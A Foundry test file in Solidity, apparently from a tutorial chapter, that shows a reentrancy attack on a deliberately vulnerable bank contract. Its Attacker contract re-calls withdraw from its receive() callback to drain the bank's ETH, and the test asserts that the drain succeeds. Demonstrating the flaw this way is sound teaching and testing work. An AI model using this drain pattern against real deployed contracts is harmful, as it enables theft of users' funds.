// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/ch22/VulnerableBank.sol";

/// @title ReentrancyTest - 重入攻击 Foundry 测试
/// @notice 使用攻击者合约验证 VulnerableBank 的重入漏洞
contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(address(bank));
    }

    function test_reentrancy_exploit() public {
        // 给银行存入 10 ETH
        vm.deal(address(bank), 10 ether);
        bank.deposit{value: 1 ether}();

        // 攻击者只存入 1 ETH，但尝试提取更多
        attacker.attack{value: 1 ether}();

        // 验证：攻击者应该成功抽走银行的所有 ETH
        assertGt(address(attacker).balance, 1 ether);
    }
}

/// @title Attacker - 重入攻击者合约
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackAmount;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        attackAmount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        // 重入：在转账回调中再次调用 withdraw
        if (address(bank).balance >= attackAmount) {
            bank.withdraw(attackAmount);
        }
    }
}
